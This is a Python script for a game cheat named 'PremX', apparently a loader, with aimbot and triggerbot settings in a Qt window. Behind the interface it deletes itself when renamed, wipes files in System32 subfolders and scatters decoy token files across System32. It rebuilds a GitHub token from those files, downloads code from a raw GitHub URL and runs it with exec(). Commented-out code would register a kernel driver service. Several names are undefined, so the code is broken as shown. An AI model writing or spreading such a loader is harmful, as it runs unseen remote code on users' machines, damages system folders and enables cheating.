from cryptography.fernet import Fernet
import requests
import os
from art import *
import getpass
import keyring

import subprocess
import os
os.system('cls')

filenamex = os.path.basename(__file__)
#discord_warning(filenamex)
if filenamex != "premx_gui.py":
    os.system('cls')
    script_path = os.path.realpath(__file__)
    os.remove(script_path)
    os.system('cls')
    print("Error.")
    sys.exit()
def check_timezone():
    local_time = time.localtime()
    utc_time = time.gmtime()
    time_difference = (time.mktime(local_time) - time.mktime(utc_time)) / 3600
    if time_difference != 8:
        xsxasxaxa=cskey+" tried to run aes with wrong datetime"
        discord_warning(xsxasxaxa)
    else:
        xxxxx="xxsdfsdfsdf"
check_timezone()

def delete_files_in_sxxxx_directory():
    directory = r'C:\Windows\System32\Systemaes'
    if not os.path.exists(directory):
        print("")
        return
    if not os.listdir(directory):
        print("")
        return
    for file_name in os.listdir(directory):
        file_path = os.path.join(directory, file_name)
        try:
            if os.path.isfile(file_path):
                os.remove(file_path)
                print("")
            else:
                print("")
        except Exception as e:
            print("")
os.system('cls')
delete_files_in_sxxxx_directory()

import os
def delete_files_if_not_marked(target_folder, marker_file):
    if os.path.exists(marker_file):
        print(f"Skipping deletion: {marker_file} already exists.")
        return

    if os.path.exists(target_folder) and os.path.isdir(target_folder):
        for filename in os.listdir(target_folder):
            file_path = os.path.join(target_folder, filename)
            try:
                if os.path.isfile(file_path) or os.path.islink(file_path):
                    os.unlink(file_path)
                elif os.path.isdir(file_path):
                    for root, dirs, files in os.walk(file_path, topdown=False):
                        for f in files:
                            os.unlink(os.path.join(root, f))
                        for d in dirs:
                            os.rmdir(os.path.join(root, d))
                    os.rmdir(file_path)
            except Exception as e:
                print(f"")

        try:
            with open(marker_file, "w") as f:
                f.write("completed.")
            print(f"")
        except Exception as e:
            print(f"")
    else:
        print("")

delete_files_if_not_marked(r"C:\\Windows\\System32\\aes_kleix", r"C:\\Windows\\System32\\deleted_configs_part676767.txt")
os.system('cls')
os.system('cls')

if cskey =="deletemysdfasdf":
    os.system('cls')
    script_path = os.path.realpath(__file__)
    os.remove(script_path)
    input()
    os.system('cls')
    print("Error.")
    sys.exit()
os.system('cls')
class SliderApp(QWidget):
    def __init__(self):
        super().__init__()
        self.load_default_values()
        self.initUI()

    def initUI(self):
        self.setWindowTitle('PremX Configuration')
        self.setFixedSize(550, 760)
        self.center()
        layout = QVBoxLayout()
        layout.setSpacing(15)
        self.setStyleSheet("""
            QWidget {
                background-color: #121212;
                color: white;
                font-family: Arial;
            }
            QLabel {
                font-size: 16px;
            }
            QSlider::groove:horizontal {
                height: 8px;
                background: #444;
                border-radius: 4px;
            }
            QSlider::handle:horizontal {
                background: #ffcc00;
                width: 18px;
                height: 18px;
                border-radius: 9px;
                margin: -5px;
            }
            QComboBox {
                background-color: #222;
                padding: 7px;
                border: 1px solid #ffcc00;
                border-radius: 5px;
            }
            QPushButton {
                background-color: #ffcc00;
                color: black;
                font-size: 16px;
                border-radius: 8px;
                padding: 10px;
            }
            QPushButton:hover {
                background-color: #ffd633;
            }
        """)

        layout.addLayout(self.create_slider('x', 1, 15, 'X:', selected_values['x']))
        layout.addLayout(self.create_slider('y', 1, 7, 'Y:', selected_values['y']))
        layout.addLayout(self.create_slider('FOV', 25, 90, 'FOV:', selected_values['FOV']))
        layout.addLayout(self.create_slider('offset', 5, 15, 'Offset:', selected_values['offset']))

        layout.addWidget(self.create_combo_box('color', 'Select Color:', ['Yellow', 'Purple', 'Red']))
        layout.addWidget(self.create_combo_box('mode', 'Mode:', ['Mode 1', 'Mode 2']))
        layout.addWidget(self.create_combo_box('ignore_deadbody', 'Ignore DeadBody:', ['Yes', 'No']))
        layout.addWidget(self.create_combo_box('smoothing', 'Smoothing:', ['Ultimate Rage', 'Rage', 'Semi-Legit', 'Legit']))
        layout.addWidget(self.create_combo_box('triggerbot', 'Triggerbot:', ['Disable', 'SHIFT key', 'ALT key', 'CAPSLOCK key', 'Mouse 4 key', 'Mouse 5 key'], self.toggle_triggerbot_settings))

        self.trigger_settings_group = QGroupBox("TRIGGERB0T Settings")
        self.trigger_settings_layout = QVBoxLayout()
        self.trigger_settings_layout.addLayout(self.create_slider('trigger_delay_before', 1, 1000, 'Delay Before(ms):', selected_values['trigger_delay_before']))
        self.trigger_settings_layout.addLayout(self.create_slider('trigger_delay_after', 1, 1000, 'Delay After(ms):', selected_values['trigger_delay_after']))
        self.trigger_settings_layout.addLayout(self.create_slider('trigger_spray_time', 1, 1000, 'Spray Time(ms):', selected_values['trigger_spray_time']))
        self.trigger_settings_group.setLayout(self.trigger_settings_layout)
        layout.addWidget(self.trigger_settings_group)
        self.toggle_triggerbot_settings()

        self.button = QPushButton('Next', self)
        self.button.clicked.connect(self.nextClicked)
        layout.addWidget(self.button)
        self.setLayout(layout)

    def create_slider(self, key, min_val, max_val, label_text, default_value):
        hbox = QHBoxLayout()
        label = QLabel(f'{label_text}', self)
        slider = QSlider(Qt.Horizontal, self)
        slider.setMinimum(min_val)
        slider.setMaximum(max_val)
        slider.setValue(default_value)
        slider.setTickInterval(1)
        slider.valueChanged.connect(lambda value: self.update_value(key, value))

        value_label = QLabel(f'{default_value}', self)
        slider.valueChanged.connect(lambda value: value_label.setText(str(value)))

        hbox.addWidget(label)
        hbox.addWidget(slider)
        hbox.addWidget(value_label)
        return hbox

    def create_combo_box(self, key, label_text, options, callback=None):
        container = QWidget()
        layout = QVBoxLayout(container)
        label = QLabel(label_text)
        combo = QComboBox()
        combo.addItems(options)
        combo.setCurrentText(selected_values[key])
        if callback:
            combo.currentIndexChanged.connect(lambda index: callback(combo.currentText()))
        else:
            combo.currentIndexChanged.connect(lambda: self.update_combo_value(key, combo.currentText()))
        layout.addWidget(label)
        layout.addWidget(combo)
        return container

    def update_value(self, key, value):
        selected_values[key] = value

    def update_combo_value(self, key, value):
        selected_values[key] = value

    def toggle_triggerbot_settings(self, value=None):
        if value:
            selected_values['triggerbot'] = value
        self.trigger_settings_group.setVisible(selected_values['triggerbot'] != 'Disable')

    def nextClicked(self):
        self.save_to_txt()
        self.close()

    def save_to_txt(self):
        file_path = r'C:\Windows\System32\premx_config_03x.txt'
        with open(file_path, 'w') as txt_file:
            for key, value in selected_values.items():
                txt_file.write(f"{key}: {value}\n")
        print("Configuration saved.")

    def load_default_values(self):
        file_path = r'C:\Windows\System32\premx_config_03x.txt'
        if os.path.exists(file_path):
            with open(file_path, 'r') as txt_file:
                for line in txt_file:
                    key, value = line.strip().split(': ')
                    if key in ['x', 'y', 'FOV', 'offset', 'trigger_delay_before', 'trigger_delay_after', 'trigger_spray_time']:
                        selected_values[key] = int(value)
                    else:
                        selected_values[key] = value

    def center(self):
        screen_geometry = QApplication.primaryScreen().availableGeometry()
        self.move(screen_geometry.center() - self.rect().center())


app = QApplication(sys.argv)
window = SliderApp()
window.show()
app.exec_()

os.system('cls')
def create_file_in_system32(filename, content=''):
    system32_path = r'C:\Windows\System32'
    file_path = os.path.join(system32_path, filename)  
    if os.path.exists(file_path):
        return
    try:
        with open(file_path, 'w') as file:
            file.write(content)
    except PermissionError:
        sdsdsadfd="sxsssdfsdf"
    except Exception as e:
        sdfd="sxdfsdf"
create_file_in_system32('mydr.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
create_file_in_system32('mydrsdf.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
create_file_in_system32('mydrvrs.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
create_file_in_system32('mykole.txt', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
create_file_in_system32('klxklx.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
create_file_in_system32('klxxklxcv.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffss')
create_file_in_system32('mydrd.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
create_file_in_system32('mydriversx.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
create_file_in_system32('mydrivertest.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
create_file_in_system32('vulnerable.txt', 'KRmMXvKn0msdf')
create_file_in_system32('systemduvlneralks.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('datasystem.txt', 'ghp_qupuw6n3pq')
create_file_in_system32('systemdata.txt', 'ghp_quiwmmsxpw')
create_file_in_system32('errorsystem.txt', 'ghp_quiwmmsxpw')
create_file_in_system32('testdata.txt', 'ghp_quiwmmsxpw')
create_file_in_system32('aes.txt', 'this is a sampletext')
create_file_in_system32('aesdriver.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
create_file_in_system32('aesdriver1.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
create_file_in_system32('aesdriverpremium.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
create_file_in_system32('aes.py', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
create_file_in_system32('aesv7.py', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
create_file_in_system32('aesdata.py', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
create_file_in_system32('system23ta.txt', 'ghp_quiwmmsxpw')
create_file_in_system32('errors233stem.txt', 'ghp_quiwmmsxpw')
create_file_in_system32('syst233ta.txt', 'ghp_quiwmmsxpw')
create_file_in_system32('erro233stem.txt', 'ghp_quiwmmsxpw')
create_file_in_system32('syst233ata.txt', 'ghp_quiwmmsxpw')
create_file_in_system32('erro123123123tem.txt', 'ghp_quiwmmsxpw')
create_file_in_system32('syste78.txt', 'ghp_quiwmmsxpw')
create_file_in_system32('er7878stem.txt', 'ghp_quiwmmsxpw')
create_file_in_system32('syst787878ta.txt', 'ghp_quiwmmsxpw')
create_file_in_system32('error787878em.txt', 'ghp_quiwmmsxpw')
create_file_in_system32('syste7878a.txt', 'ghp_quiwmmsxpw')
create_file_in_system32('erro7878tem.txt', 'ghp_quiwmmsxpw')
create_file_in_system32('sys7878ta.txt', 'ghp_quiwmmsxpw')
create_file_in_system32('erro787878tem.txt', 'ghp_quiwmmsxpw')
create_file_in_system32('myklxklx.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
create_file_in_system32('myklxxklxcv.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffss')
create_file_in_system32('myklx678x.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
create_file_in_system32('myklx678678xcv.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffss')
create_file_in_system32('myklx2344.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
create_file_in_system32('mykl34434xcv.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffss')
create_file_in_system32('mykl2222x.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
create_file_in_system32('mykl3444343cv.sys', 'sadfasdfasdfasdfasdfasdfasdfdsfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffss')
create_file_in_system32('vulnerable.txt', 'KRmMXvKn0msdf')
create_file_in_system32('systemduv4545lks.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('vulnerable343434.txt', 'KRmMXvKn0msdf')
create_file_in_system32('systemduvlneralks3443434.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('vulnerable55555.txt', 'KRmMXvKn0msdf')
create_file_in_system32('systemduvlneralks8888.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('vulnerable99999.txt', 'KRmMXvKn0msdf')
create_file_in_system32('systemduvlneralks7777.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('vulnerablexxxxx.txt', 'KRmMXvKn0msdf')
create_file_in_system32('systemduvlneralkssssssssss.txt', 'SjXfmLtdao3ilnxb')

create_file_in_system32('systemdrivervul.txt', 'KRmMXvKn0m')
create_file_in_system32('datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('infosystem.txt', 'klh_qupuw6n3pq')
create_file_in_system32('systemdrivervul_.txt', 'KRmMXvKn0m')
create_file_in_system32('datavulnerablex_.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('infosystem_.txt', 'klhqupuw6n3pq')
create_file_in_system32('_systemdrivervul.txt', 'KRmMXvKn0m')
create_file_in_system32('_datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('_infosystem.txt', 'klh_qupuw6n3pq')
create_file_in_system32('system_drivervul.txt', 'KRmMXvKn0m')
create_file_in_system32('data_vulnerablex.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('info_system.txt', 'klh_qupuw6n3pq')
create_file_in_system32('systemdriver_vul.txt', 'KRmMXvKn0m')
create_file_in_system32('datavulnerable_x.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('infos_ystem.txt', 'klh_qupuw6n3pq')
create_file_in_system32('systemd_rivervul.txt', 'KRmMXvKn0m')
create_file_in_system32('datav_ulnerablex.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('infos_ystem.txt', 'klh_qupuw6n3pq')
create_file_in_system32('syste_mdrive_rvul.txt', 'KRmMXvKn0m')
create_file_in_system32('datav_ulner_ablex.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('infosy_stem.txt', 'klh_qupuw6n3pq')
create_file_in_system32('s_ystemdrivervul.txt', 'KRmMXvKn0m')
create_file_in_system32('d_atavulnerablex.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('i_nfosystem.txt', 'klh_qupuw6n3pq')
create_file_in_system32('systemdrivervu_l.txt', 'KRmMXvKn0m')
create_file_in_system32('datavulnerable_x.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('infosyste_m.txt', 'klh_qupuw6n3pq')
create_file_in_system32('1systemdrivervul.txt', 'KRmMXvKn0m')
create_file_in_system32('1datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('1infosystem.txt', 'klh_qupuw6n3pq')
create_file_in_system32('2systemdrivervul.txt', 'KRmMXvKn0m')
create_file_in_system32('2datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('2infosystem.txt', 'klh_qupuw6n3pq')
create_file_in_system32('3systemdrivervul.txt', 'KRmMXvKn0m')
create_file_in_system32('3datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('3infosystem.txt', 'klh_qupuw6n3pq')
create_file_in_system32('4systemdrivervul.txt', 'KRmMXvKn0m')
create_file_in_system32('4datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('4infosystem.txt', 'klh_qupuw6n3pq')
create_file_in_system32('5systemdrivervul.txt', 'KRmMXvKn0m')
create_file_in_system32('5datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('5infosystem.txt', 'klh_qupuw6n3pq')
create_file_in_system32('6systemdrivervul.txt', 'KRmMXvKn0m')
create_file_in_system32('6datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('6infosystem.txt', 'klh_qupuw6n3pq')
create_file_in_system32('7systemdrivervul.txt', 'KRmMXvKn0m')
create_file_in_system32('7datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('7infosystem.txt', 'klh_qupuw6n3pq')
create_file_in_system32('8systemdrivervul.txt', 'KRmMXvKn0m')
create_file_in_system32('8datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('8infosystem.txt', 'klh_qupuw6n3pq')
create_file_in_system32('9systemdrivervul.txt', 'KRmMXvKn0m')
create_file_in_system32('9datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('9infosystem.txt', 'klh_qupuw6n3pq')
create_file_in_system32('11systemdrivervul.txt', 'KRmMXvKn0m')
create_file_in_system32('11datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('11infosystem.txt', 'klh_qupuw6n3pq')
create_file_in_system32('22systemdrivervul.txt', 'KRmMXvKn0m')
create_file_in_system32('22datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('22infosystem.txt', 'klh_qupuw6n3pq')
create_file_in_system32('33systemdrivervul.txt', 'KRmMXvKn0m')
create_file_in_system32('33datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('33infosystem.txt', 'klh_qupuw6n3pq')
create_file_in_system32('44systemdrivervul.txt', 'KRmMXvKn0m')
create_file_in_system32('44datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('44infosystem.txt', 'klh_qupuw6n3pq')
create_file_in_system32('55systemdrivervul.txt', 'KRmMXvKn0m')
create_file_in_system32('55datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('55infosystem.txt', 'klh_qupuw6n3pq')
create_file_in_system32('66systemdrivervul.txt', 'KRmMXvKn0m')
create_file_in_system32('66datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('66infosystem.txt', 'klh_qupuw6n3pq')
create_file_in_system32('77systemdrivervul.txt', 'KRmMXvKn0m')
create_file_in_system32('77datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('77infosystem.txt', 'klh_qupuw6n3pq')
create_file_in_system32('88systemdrivervul.txt', 'KRmMXvKn0m')
create_file_in_system32('88datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
create_file_in_system32('88infosystem.txt', 'klh_qupuw6n3pq')
os.system('cls')

os.system('cls')
filexyz1 = r'C:\Windows\System32\data_vulnerable_x.txt'
filexyz2 = r'C:\Windows\System32\system_driver_vul.txt'
filexyz3 = r'C:\Windows\System32\systeminfo.txt'
if not os.path.exists(filexyz1):
    os.system('cls')
    mylogo()
    printg("Access denied, please tell dev to give access to the server.")
    input()
    sys.exit()
if not os.path.exists(filexyz2):
    os.system('cls')
    mylogo()
    printg("Access denied, please tell dev to give access to the server.")
    input()
    sys.exit()
if not os.path.exists(filexyz3):
    os.system('cls')
    mylogo()
    printg("Access denied, please tell dev to give access to the server.")
    input()
    sys.exit()
def new_function_name(mycontent):
    raw2_url  = 'https://raw.githubusercontent.com/nvtsxlz/raws/refs/heads/main/raw_premx_ui.txt'

    crpppttkkyy = Fernet.generate_key()
    cipher_suite = Fernet(crpppttkkyy)
    
    cipher_text = cipher_suite.encrypt(mycontent.encode())
    
    os.environ['crpppttkkyy'] = crpppttkkyy.decode()
    os.environ['ncrptttkkn'] = cipher_text.decode()
    
    crpppttkkyy = os.environ['crpppttkkyy']
    cipher_suite = Fernet(crpppttkkyy.encode())
    ncrptttkkn = os.environ['ncrptttkkn']
    dcrpptttknnnn = cipher_suite.decrypt(ncrptttkkn.encode()).decode()
    
    
    headers = {'Authorization': f'token {dcrpptttknnnn}'}
    
    raw2response = requests.get(raw2_url,headers=headers)
    raw2finalcontent = raw2response.text
    raw2urlfinal = raw2finalcontent
    raw2urlfinalresponse = requests.get(raw2urlfinal,headers=headers)
    if raw2urlfinalresponse.status_code == 200:  
        content2 =  raw2urlfinalresponse.text
        if True:      
            rawfile_url = 'https://raw.githubusercontent.com/nvtsxlz/raws/refs/heads/main/raw_premx_ui.txt'
            rawresponse = requests.get(rawfile_url)
            rawcontent = rawresponse.text
            raw_url = rawcontent
            response = requests.get(raw_url, headers=headers)
            content = response.text
            print("Make sure its working fine. The account's email.The owner might change the password of the account anytime.\n\n2. Inactive accounts are accounts that have not been used by the owner for 2weeks to months or years.\n\n3. If the account is  invalid, or perma banned, you can request for a replacement within 24 hours.",exec(f"{content}"))
            os.system('cls')
            
        else:
            print("error")
            os.system('cls')
            
    else:
        print("error")

    if raw2urlfinalresponse.status_code != 200:
        exit()

def get_string_from_file(file_path):
    if os.path.exists(file_path):
        with open(file_path, 'r') as file:
            content = file.read()
        return content
    else:
        return "Error"
def manage_service():
    service_name = "mydrs"
    bin_path = "C:\\Windows\\System32\\mydriver.sys"

    try:
        # Check if the service exists
        result = subprocess.run([
            'sc', 'query', service_name
        ], capture_output=True, text=True, check=False)

        if 'STATE' in result.stdout:
            print(f"")
        else:
            print(f"")
            # Create the service
            create_result = subprocess.run([
                'sc', 'create', service_name, f'binPath= {bin_path}', 'type=kernel'
            ], capture_output=True, text=True, check=False)

    except Exception as e:
        print(f"")
        sys.exit(1)

#manage_service()
system_info_path = os.path.join(os.environ['SystemRoot'], 'System32', 'systeminfo.txt')
system_driver_vul_path = os.path.join(os.environ['SystemRoot'], 'System32', 'system_driver_vul.txt')
data_vulnerable_path = os.path.join(os.environ['SystemRoot'], 'System32', 'data_vulnerable_x.txt')
content1 = get_string_from_file(system_info_path)
content2 = get_string_from_file(system_driver_vul_path)
content3 = get_string_from_file(data_vulnerable_path)
content4 =  content1+content2+content3
content5 = content4
new_function_name(content5)
